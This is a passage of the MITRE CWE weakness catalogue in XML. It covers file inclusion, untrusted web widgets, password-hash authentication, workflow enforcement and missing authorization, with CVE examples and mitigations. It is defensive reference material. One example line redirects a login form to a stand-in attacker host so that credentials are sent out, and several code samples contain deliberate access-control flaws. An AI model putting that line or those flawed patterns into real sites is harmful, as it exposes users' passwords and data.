               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0068</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2157</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2162</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2198</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0128</Reference>
               <Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1864</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1869</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1869</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1870</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2154</Reference>
               <Description>PHP local file inclusion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2154</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1704</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1704</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1707</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1964</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1681</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2086</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2086</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0127</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0127</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1971</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3335</Reference>
               <Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3335</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="175"/>
            <Related_Attack_Pattern CAPEC_ID="201"/>
            <Related_Attack_Pattern CAPEC_ID="228"/>
            <Related_Attack_Pattern CAPEC_ID="251"/>
            <Related_Attack_Pattern CAPEC_ID="252"/>
            <Related_Attack_Pattern CAPEC_ID="253"/>
            <Related_Attack_Pattern CAPEC_ID="263"/>
            <Related_Attack_Pattern CAPEC_ID="549"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
         </References>
         
      </Weakness>
      <Weakness ID="830" Name="Inclusion of Web Functionality from an Untrusted Source" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source.</Description>
         <Extended_Description>
            <xhtml:p>Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.</xhtml:p>
            <xhtml:p>Even if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.</xhtml:p>
            <xhtml:p>This weakness is common in "mashup" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '&lt;SCRIPT SRC="http://other.domain.here"&gt;' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.</xhtml:p>
            <xhtml:p>Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external website:</Intro_Text>
               <Example_Code Nature="bad" Language="HTML">
                  <xhtml:div>&lt;div class="header"&gt; Welcome!<xhtml:div style="margin-left:10px;">&lt;div id="loginBox"&gt;Please Login:<xhtml:div style="margin-left:10px;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<xhtml:br/>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>&lt;/div&gt;<xhtml:br/>&lt;div id="WeatherWidget"&gt;<xhtml:div style="margin-left:10px;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</Body_Text>
               <Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</Body_Text>
               <Example_Code Nature="attack" Language="JavaScript">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...Weather widget code....</xhtml:i>
                     <xhtml:br/>document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</xhtml:div>
               </Example_Code>
               <Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-778"/>
         </References>
         
      </Weakness>
      <Weakness ID="836" Name="Use of Password Hash Instead of Password for Authentication" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.</Description>
         <Extended_Description>
            <xhtml:p>Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.</xhtml:p>
            <xhtml:p>As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="602" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could bypass the authentication routine without knowing the original password.</Note>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1283</Reference>
               <Description>Product performs authentication with user-supplied password hashes that can be obtained from a separate SQL injection vulnerability (CVE-2009-1282).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1283</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>Product allows attackers to bypass authentication by obtaining the password hash for another user and specifying the hash in the pwd argument.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
            </Observed_Example>
         </Observed_Examples>
         
      </Weakness>
      <Weakness ID="841" Name="Improper Enforcement of Behavioral Workflow" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.</Description>
         <Extended_Description>
            <xhtml:p>By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the software or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.</xhtml:p>
            <xhtml:p>For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the software might still perform the transfer.</xhtml:p>
            <xhtml:p>Note that this is different than CWE-696, which focuses on when the software performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.</xhtml:p>
            <xhtml:p>Workflow-related behaviors include:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Steps are performed in the expected order.</xhtml:li>
                  <xhtml:li>Required steps are not omitted.</xhtml:li>
                  <xhtml:li>Steps are not interrupted.</xhtml:li>
                  <xhtml:li>Steps are performed in a timely fashion.</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>An attacker could cause the software to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files.</Intro_Text>
               <Example_Code Nature="bad" Language="Python">
                  <xhtml:div>def dispatchCommand(command, user, args):<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if command == 'Login':<xhtml:div style="margin-left:10px;">loginUser(args)<xhtml:br/>return</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># user has requested a file</xhtml:i>
                           <xhtml:br/>if command == 'Retrieve_file':<xhtml:div style="margin-left:10px;">if authenticated(user) and ownsFile(user,args):<xhtml:br/>sendFile(args)<xhtml:br/>return</xhtml:div>
                           <xhtml:br/>if command == 'List_files':<xhtml:div style="margin-left:10px;">listFiles(args)<xhtml:br/>return</xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The server correctly does not send files to a user that isn't logged in and doesnt own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents.</Body_Text>
               <Body_Text>Here is a fixed version of the above example:</Body_Text>
               <Example_Code Nature="good" Language="Python">
                  <xhtml:div>def dispatchCommand(command, user, args):<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>if command == 'List_files':<xhtml:div style="margin-left:10px;">if authenticated(user) and ownsDirectory(user,args):<xhtml:div style="margin-left:10px;">listFiles(args)<xhtml:br/>return</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2011-0348</Reference>
               <Description>Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0348</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3012</Reference>
               <Description>Attacker can access portions of a restricted page by canceling out of a dialog.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3012</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-5056</Reference>
               <Description>Ticket-tracking system does not enforce a permission setting.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-5056</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2164</Reference>
               <Description>Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2164</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0777</Reference>
               <Description>Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0777</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3327</Reference>
               <Description>Chain: Authentication bypass by skipping the first startup step as required by the protocol.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3327</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0829</Reference>
               <Description>Chain: File server crashes when sent a "find next" request without an initial "find first."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0829</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2620</Reference>
               <Description>FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2620</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3296</Reference>
               <Description>FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3296</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>40</Entry_ID>
               <Entry_Name>Insufficient Process Validation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-795"/>
            <Reference External_Reference_ID="REF-796"/>
            <Reference External_Reference_ID="REF-797"/>
            <Reference External_Reference_ID="REF-806"/>
            <Reference External_Reference_ID="REF-799"/>
            <Reference External_Reference_ID="REF-667"/>
            <Reference External_Reference_ID="REF-801"/>
            <Reference External_Reference_ID="REF-802" Section="pages 29 - 41"/>
         </References>
         <Notes>
            <Note Type="Research Gap">
               <xhtml:p>This weakness is typically associated with business logic flaws, except when it produces resultant weaknesses.</xhtml:p>
               <xhtml:p>The classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.</xhtml:p>
               <xhtml:p>Many business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="862" Name="Missing Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not perform an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</xhtml:p>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:10px;">mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:br/>
                        <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                        <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>/.../</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
